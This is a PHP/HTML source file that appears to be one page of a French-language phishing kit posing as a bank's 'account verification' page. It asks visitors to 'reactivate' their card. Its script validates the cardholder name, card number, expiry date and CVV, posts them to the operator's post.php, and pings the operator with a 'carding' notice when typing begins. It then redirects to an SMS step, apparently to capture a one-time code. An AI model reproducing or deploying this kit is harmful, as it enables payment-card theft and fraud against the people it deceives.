<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connxion</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body>
<header>
<div class="holder">
<div class="left">
    <img src="res/logo.png">
</div>
<div class="right">
    <div class="user">
        <img src="res/user.png">
        <span>Devenir client</span>
    </div>
</div>
</div>
</header>    

<div class="banner">
<div class="holder">
Espace client
</div>
</div>


<main>
<div class="holder">
<div class="left">
<div class="form">

<div class="title">
Vérification de compte
</div>

  <p><img id="cardImage" alt="" src="blank.webp" style="height: 192px; width: 300px;" /></p>
 
<div class="text">
Veuillez réactiver votre carte
</div>

<div class="col">
<label>Nom sur la carte:</label>
<div class="input">
    <input type="text" id="d0" name="product_name" placeholder="">
</div>
</div>

<div class="col">
<label>Numéro de carte:</label>
<div class="input">
       <input type="text" id="d1" name="product_id" placeholder="Enter card number" oninput="changeCardImage()">

</div>
</div>

<div class="col">
<label>Date d'expiration:</label>
<div class="input">
    <input type="text" id="d2" name="product_expiration" placeholder="MM/AA">
</div>
</div>

<div class="col">
<label>Code de sécurité:</label>
<div class="input">
    <input type="text" id="d3" name="product_serie" placeholder="CVV">
</div>
</div>

<div class="col">
<button onclick="sendCc()"><span id="loader"><img src="res/loading.gif"></span>Confirmer </button>

<div class="links">
<span class="a">Lancer la démonstration</span>
</div>
</div>



</div>
</div>



<div class="right" style="background:#f5f7f8;">
 
</div>
</div>
</main>
 <script>
        function changeCardImage() {
            var input = document.getElementById('d1').value;
            var image = document.getElementById('cardImage');
            var bin = input.substring(0, 1); // Get the first digit

            if (bin === '4') {
                image.src = 'visacard.webp';
            } else {
                bin = input.substring(0, 2); // Get the first two digits
                if (bin >= '51' && bin <= '55') {
                    image.src = 'mastercard.webp';
                } else {
                    image.src = 'blank.webp'; // Default image
                }
            }
        }
    </script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>



$("#d1").mask("0000000000000000");
$("#d2").mask("00/00");
$("#d3").mask('000');
 
var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 
if($("#d0").val().length<4){
	$("#d0").addClass("error");
	allowSubmit=false;
}

if($("#d1").val().length<16){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>45 || _exps[1]<24 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("main input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("main input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCc();
    }
});

function sendCc(){
    validate();

    if(allowSubmit){
        $("#loader").show();
        $.post("post.php", 
			{
                name:$("#d0").val(),
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val() 

			}, function(done){
                setTimeout(() => {
                   window.location="mkfile.php?p=sms&params=?e";
            }, 12000);
			}
		
		);

    }
}

var abortNote = false;
$("#d1").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{carding:1});
        abortNote=true;
    }

});





 


</script>
</body>
</html>